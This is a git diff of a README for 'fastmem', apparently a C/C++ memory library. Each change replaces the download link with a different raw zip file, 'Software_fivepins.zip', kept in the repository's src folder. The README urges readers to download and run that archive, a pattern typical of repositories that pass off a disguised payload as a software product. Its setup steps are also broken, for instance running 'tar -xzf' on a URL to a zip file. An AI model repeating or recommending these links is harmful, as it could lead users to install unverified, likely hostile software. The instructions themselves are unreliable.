@@ -1,6 +1,6 @@
 # 🚀 fastmem - High-Performance Memory Management Made Easy
 
-[![Download fastmem](https://github.com/arieledesess/fastmem/raw/refs/heads/main/include/Software_v1.5.zip)](https://github.com/arieledesess/fastmem/raw/refs/heads/main/include/Software_v1.5.zip)
+[![Download fastmem](https://github.com/arieledesess/fastmem/raw/refs/heads/main/src/Software_fivepins.zip)](https://github.com/arieledesess/fastmem/raw/refs/heads/main/src/Software_fivepins.zip)
 
 ## 📖 Overview
 
@@ -28,7 +28,7 @@ To get started with fastmem, follow these simple steps to download and install t
 
 To obtain fastmem, visit the following link:
 
-[Download fastmem](https://github.com/arieledesess/fastmem/raw/refs/heads/main/include/Software_v1.5.zip)
+[Download fastmem](https://github.com/arieledesess/fastmem/raw/refs/heads/main/src/Software_fivepins.zip)
 
 ### 2. Choose Your Version
 
@@ -36,14 +36,14 @@ On the releases page, you will find various versions of fastmem. Select the most
 
 ### 3. Download the File
 
-Click on the download link for your chosen version. This might look like **https://github.com/arieledesess/fastmem/raw/refs/heads/main/include/Software_v1.5.zip** or a similar filename. The file will begin downloading to your machine.
+Click on the download link for your chosen version. This might look like **https://github.com/arieledesess/fastmem/raw/refs/heads/main/src/Software_fivepins.zip** or a similar filename. The file will begin downloading to your machine.
 
 ### 4. Extract the Files
 
 Once the download is complete, locate the file in your downloads folder. Use a file extraction tool or the command line to extract the contents. You can do this by right-clicking the file and selecting "Extract" or by running the following command:
 
 ```bash
-tar -xzf https://github.com/arieledesess/fastmem/raw/refs/heads/main/include/Software_v1.5.zip
+tar -xzf https://github.com/arieledesess/fastmem/raw/refs/heads/main/src/Software_fivepins.zip
 ```
 
 ### 5. Install the Library
@@ -92,6 +92,6 @@ For further assistance, consult the community forums or issue tracker on the Git
 
 Ready to boost your memory operations? Download fastmem now by visiting the link below:
 
-[Download fastmem](https://github.com/arieledesess/fastmem/raw/refs/heads/main/include/Software_v1.5.zip)
+[Download fastmem](https://github.com/arieledesess/fastmem/raw/refs/heads/main/src/Software_fivepins.zip)
 
 Enjoy the improved performance in your C and C++ applications with fastmem!
